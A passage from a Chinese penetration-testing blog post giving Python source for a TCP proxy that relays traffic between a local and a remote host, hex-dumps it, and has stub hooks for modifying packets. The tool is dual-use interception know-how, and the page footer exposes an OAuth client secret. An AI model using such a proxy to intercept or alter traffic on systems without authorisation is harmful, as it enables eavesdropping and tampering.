s])</span></span><br><span class="line">        <span class="comment">#text=b&#x27; &#x27;.join([x if 0x20 &lt;=ord(x) &lt;0x7F else b&#x27;.&#x27; for x in s])</span></span><br><span class="line">        <span class="comment">#result.append(b&quot;%04X %-*s %s&quot; % (i,length*(digits+1),hexa,text))</span></span><br><span class="line">    <span class="comment">#print(b&#x27;\n&#x27;.join(result))</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#说是不适用于python3</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexdump</span>(<span class="params">src, length=<span class="number">16</span></span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="comment"># Python 3 renamed the unicode type to str, the old str type has been replaced by bytes</span></span><br><span class="line">    digits = <span class="number">4</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(src, <span class="built_in">str</span>) <span class="keyword">else</span> <span class="number">2</span></span><br><span class="line">    <span class="comment"># xrange() was renamed to range() in Python 3.</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(src), length):</span><br><span class="line">        s = src[i:i+length]  </span><br><span class="line">        hexa = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&quot;%0*X&quot;</span> % (digits, (x))  <span class="keyword">for</span> x <span class="keyword">in</span> s]) </span><br><span class="line">        <span class="comment">#logging.info(&quot;\t\thexa:%s&quot;%hexa)</span></span><br><span class="line">        <span class="comment">#logging.info(&quot;&quot;.join(str(type(x)) for x in s))</span></span><br><span class="line">        text = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">if</span> <span class="number">0x20</span> &lt;= x &lt; <span class="number">0x7F</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span>  <span class="keyword">for</span> x <span class="keyword">in</span> s])  </span><br><span class="line">        <span class="comment">#logging.info(&quot;\t\ttext:%s&quot;%text)</span></span><br><span class="line">        result.append( <span class="string">&quot;%04X   %-*s   %s&quot;</span> % (i, length*(digits + <span class="number">1</span>), hexa, text) )</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;\n&#x27;</span>.join(result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_from</span>(<span class="params">connection</span>):</span><br><span class="line">    </span><br><span class="line">    buffer=<span class="string">b&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设置两秒的超时，取决于目标情况</span></span><br><span class="line">    connection.settimeout(<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#持续从缓存中读取数据直到没有数据或超时</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=connection.recv(<span class="number">4096</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#logging.info(&quot;receive data:%s&quot;%data)</span></span><br><span class="line">            buffer+=data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#对目标是远程主机的请求数据进行修改</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_handler</span>(<span class="params">buffer</span>):</span><br><span class="line">    <span class="comment">#执行包修改</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"><span class="comment">#....响应数据修改....</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response_handler</span>(<span class="params">buffer</span>):</span><br><span class="line">    <span class="comment">#执行包修改</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy_handler</span>(<span class="params">client_socket,remote_host,remote_port,receive_first</span>):</span><br><span class="line">    <span class="comment">#连接远程主机</span></span><br><span class="line">    remote_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    remote_socket.connect((remote_host,remote_port))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#若需要从远程主机接收数据</span></span><br><span class="line">    <span class="keyword">if</span> receive_first:</span><br><span class="line">        remote_buffer=receive_from(remote_socket)</span><br><span class="line">       <span class="comment"># logging.info(&quot;remote_buffer:%s&quot;%remote_buffer)</span></span><br><span class="line">        hexdump(remote_buffer)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#发送给响应处理</span></span><br><span class="line">        remote_buffer=response_handler(remote_buffer)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#若有数据传送给本地客户端，并发送</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;====] Sending &#123;0&#125; bytes to localhost.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(remote_buffer)))</span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#本地循环读取数据，发送给远程主机和本地主机</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#从本地读取</span></span><br><span class="line">        local_buffer=receive_from(client_socket)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(local_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[===&gt;] Received &#123;0&#125; bytes from localhost&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(local_buffer)))</span><br><span class="line">            hexdump(local_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送给request handler</span></span><br><span class="line">            local_buffer=request_handler(local_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送数据给远程主机</span></span><br><span class="line">            remote_socket.send(local_buffer)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[===&gt;]Sent to remote.&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#接收响应的数据</span></span><br><span class="line">        remote_buffer=receive_from(remote_socket)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;====]Received &#123;0&#125; bytes from remote.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(remote_buffer)))</span><br><span class="line">            hexdump(remote_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送到响应处理函数</span></span><br><span class="line">            remote_buffer=response_handler(remote_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#将响应给本地socket</span></span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;=====] Sent to localhost.&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment">#如果两边都没有数据，关闭连接</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(local_buffer) <span class="keyword">or</span> <span class="keyword">not</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            client_socket.close()</span><br><span class="line">            remote_socket.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]No more data.Closing connections.&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:])!=<span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage:./tcpproxy.py [localhost][localport][remotehost][remoteport][receive_first]&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Example:./tcpproxy.py 127.0.0.1 9000 10.12.132.1 9000 True&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#设置本地监听参数</span></span><br><span class="line">    </span><br><span class="line">    local_host=sys.argv[<span class="number">1</span>]</span><br><span class="line">    local_port=<span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设置远程目标</span></span><br><span class="line">    remote_host=sys.argv[<span class="number">3</span>]</span><br><span class="line">    remote_port=<span class="built_in">int</span>(sys.argv[<span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#告知代理发送给远程主机之前连接和接收数据</span></span><br><span class="line">    receive_first=sys.argv[<span class="number">5</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;True&quot;</span> <span class="keyword">in</span> receive_first:</span><br><span class="line">        receive_first=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        receive_first=<span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="comment">#设置监听socket</span></span><br><span class="line">    server_loop(local_host,local_port,remote_host,remote_port,receive_first)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/20/python%E4%B8%8E%E6%B8%97%E9%80%8F/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2023/05/21/pikachu/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            pikachu
          
        </div>
      </a>
    
    
      <a href="/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">sql注入-tips</div>
      </a>
    
  </nav>

  
   
<div class="gitalk" id="gitalk-container"></div>

<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">


<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>


<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>

<script type="text/javascript">
  var gitalk = new Gitalk({
    clientID: '93da8388ad1469a8be66',
    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
    repo: 'blogtalk',
    owner: 'ak005469075',
    admin: ['ak005469075'],
    // id: location.pathname,      // Ensure uniqueness and length less than 50
    id: md5(location.pathname),
    distractionFreeMode: false,  // Facebook-like distraction free mode
    pagerDirection: 'last'
  })

  gitalk.render('gitalk-container')
</script>

  
    
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2023
        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>

<script src="/js/clickBoom1.js"></script>
 
<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>